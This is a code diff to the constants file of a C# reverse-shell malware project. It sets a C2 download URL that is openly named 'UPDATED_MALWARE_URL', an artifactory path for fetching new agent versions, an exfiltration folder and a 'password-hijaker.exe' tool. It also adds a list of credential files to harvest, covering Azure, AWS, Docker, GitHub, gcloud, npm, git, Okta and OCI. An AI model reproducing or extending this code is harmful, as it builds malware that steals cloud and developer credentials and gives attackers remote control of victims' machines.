@@ -28,20 +28,41 @@ namespace WebSocketReverseShellDotNet.utils
 
         public const String LOCK_FILE_NAME = "93803181808-lock";
 
-        public  const String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
-        public  const String UPDATED_MALWARE_URL= "https://c2-binaries.s3.us-east-2.amazonaws.com/reverseShell-1.0.1-zip.zip";
+        public const String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
+        public const String UPDATED_MALWARE_URL= "https://c2-binaries.s3.us-east-2.amazonaws.com/reverseShell-1.0.1-zip.zip";
 
-        public  const String JFROG_META_DATA_FILE= "maven-metadata.xml";
+        public const String JFROG_META_DATA_FILE= "maven-metadata.xml";
 
 
-        public  const String JFROG_LATEST_AGENT_PATH= "%s/reverseShell-%s-zip.zip";
+        public const String JFROG_LATEST_AGENT_PATH= "%s/reverseShell-%s-zip.zip";
 
-        public  const String JFROG_LATEST_REGEX= "<latest>(.*?)<\\/latest>";
+        public const String JFROG_LATEST_REGEX= "<latest>(.*?)<\\/latest>";
 
         public const String EXFILTRATE_FOLDER = ".exfiltrate";
-        public  const String NEW_AGENT_DIRECTORY= ".agent";
-        public  const String CUSTOM_SCRIPT_DIRECTORY = ".scripts";
+        public const String NEW_AGENT_DIRECTORY= ".agent";
+        public const String CUSTOM_SCRIPT_DIRECTORY = ".scripts";
 
-        public  const String PASSWORD_HIJACKER = "password-hijaker.exe";
+        public const String PASSWORD_HIJACKER = "password-hijaker.exe";
+        public const String RICK_ROLL = "WebSocketReverseShellDotNet.rick-roll-bass-boosted.mp3";
+
+        public static string[] LIST_OF_CRED_LOCATIONS = [
+            "%USERPROFILE%\\.azure\\azureProfile.json",
+            "%USERPROFILE%\\.azure\\accessTokens.json",
+            "%USERPROFILE%\\.docker\\config.json",
+            "%APPDATA%\\gh\\config.yml",
+            "%UserProfile%\\.aws\\credentials",
+            "%UserProfile%\\.aws\\config",
+            "%UserProfile%\\.okta\\okta.yaml",
+            "%USERPROFILE%\\.netrc",
+            "%USERPROFILE%\\.git-credentials",
+            "%USERPROFILE%\\.npmrc",
+            "%APPDATA%\\gcloud\\credentials.db",
+            "%APPDATA%\\gcloud\\application_default_credentials.json",
+            "%USERPROFILE%\\.oci\\config",
+            "%GOOGLE_APPLICATION_CREDENTIALS%",
+
+        ];
+
+
     }
 }
